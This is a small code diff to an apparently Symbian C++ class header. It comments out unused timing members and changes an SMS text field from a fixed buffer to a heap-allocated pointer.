@@ -83,12 +83,15 @@ private:
 
 private:
 	
+	/* not used 
 	TInt iRepeatAction;
 	TInt iIter;
 	TInt iDelay;
-		
+		*/
+	
 	CTelephony::TTelNumber iSmsNumber;
-	TBuf<140> iSmsText;
+	//TBuf<140> iSmsText;
+	HBufC* iSmsText;
 	CSmsReceiverSocket* iSmsRecv;
 	CLogCleaner* iLogCleaner;
 	RSocketServ iSocketServ;
